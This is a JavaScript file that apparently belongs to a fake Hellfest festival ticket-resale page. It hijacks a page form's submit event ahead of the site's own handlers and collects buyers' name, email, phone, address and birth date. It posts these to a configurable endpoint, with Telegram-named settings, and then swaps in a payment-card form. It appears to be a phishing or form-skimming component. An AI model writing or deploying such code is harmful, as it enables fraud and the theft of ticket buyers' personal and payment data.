(() => {
  "use strict";

  const config = window.HELLFEST_TELEGRAM_CONFIG ?? {
    apiUrl: "/api/orders",
    enabled: true,
  };
  if (config.enabled === false) return;

  const formSelector =
    ".widget-section div[class*='grid-col'] > div > div:nth-child(4) form";

  const getFieldValues = (form) => {
    const inputs = Array.from(form.querySelectorAll("input"));
    const selects = Array.from(form.querySelectorAll("select"));
    const panel = form.closest(
      ".widget-section div[class*='grid-col'] > div > div:nth-child(4)"
    );
    if (!panel || inputs.length < 4 || selects.length < 3) return null;

    const panelText = panel.textContent ?? "";
    const quantityMatch = panelText.match(/(\d+)\s*[×x]\s*Pass 4 jours/i);
    const priceBlock = Array.from(panel.querySelectorAll("div")).find((node) =>
      (node.textContent ?? "").trim().startsWith("Prix :")
    );
    const priceText = (priceBlock?.textContent ?? "")
      .replace(/^Prix\s*:\s*/i, "")
      .trim();
    const unitPrice = priceText.match(/×\s*([^)]+)/)?.[1]?.trim() ?? priceText;

    return {
      nom: inputs[0].value.trim(),
      email: inputs[1].value.trim(),
      tel: inputs[2].value.trim(),
      adresse: inputs[3].value.trim(),
      jour: selects[0].value,
      mois: selects[1].value,
      annee: selects[2].value,
      quantity: Number(quantityMatch?.[1] ?? 1),
      unitPrice,
      totalPrice: priceText,
      product: "Pass 4 Jours - Revente",
    };
  };

  const showError = (form, message) => {
    const existing = form.querySelector("[data-telegram-error]");
    const error = existing ?? document.createElement("div");
    error.dataset.telegramError = "true";
    error.textContent = message;
    error.style.cssText =
      "background:#421719;border:1px solid #ed202e;border-radius:7px;padding:12px 14px;margin-bottom:14px;color:#ffb3b3;font-size:13px;line-height:1.45;";
    if (!existing) form.prepend(error);
  };

  const showPaymentForm = (form, orderData) => {
    const wrapper = document.createElement("div");
    wrapper.dataset.hfPaymentWrapper = "true";
    form.replaceWith(wrapper);
    if (window.HfPaymentCard) {
      window.HfPaymentCard.show(wrapper, orderData);
    } else {
      wrapper.textContent = "Le formulaire de paiement est momentanément indisponible.";
    }
  };

  const sendForm = async (form, submitButton) => {
    const values = getFieldValues(form);
    if (!values) {
      showError(form, "Impossible de lire les informations du formulaire.");
      return;
    }

    submitButton.disabled = true;
    submitButton.dataset.originalLabel = submitButton.textContent ?? "Continuer";
    submitButton.textContent = "Envoi en cours…";
    submitButton.style.opacity = "0.7";
    try {
      const response = await fetch(config.apiUrl || "/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(values),
      });
      if (!response.ok) {
        let message = "La commande n’a pas pu être enregistrée.";
        try { message = (await response.json()).error || message; } catch {}
        throw new Error(message);
      }
      const order = await response.json();
      showPaymentForm(form, {
        ...values,
        paymentReference: order.paymentReference,
        orderReference: order.orderReference,
        notificationSent: order.notificationSent,
      });
    } catch (error) {
      submitButton.disabled = false;
      submitButton.textContent = submitButton.dataset.originalLabel;
      submitButton.style.opacity = "1";
      showError(form, error.message || "L’envoi a échoué. Vérifiez votre connexion puis réessayez.");
    }
  };

  document.addEventListener("submit", (event) => {
    if (event.target.closest?.(".hf-proof-form")) return;
    const form = event.target.closest?.(formSelector);
    if (!form) return;
    event.preventDefault();
    event.stopPropagation();
    event.stopImmediatePropagation();
    const submitButton = form.querySelector("button[type='submit']");
    if (submitButton && !submitButton.disabled) void sendForm(form, submitButton);
  }, true);
})();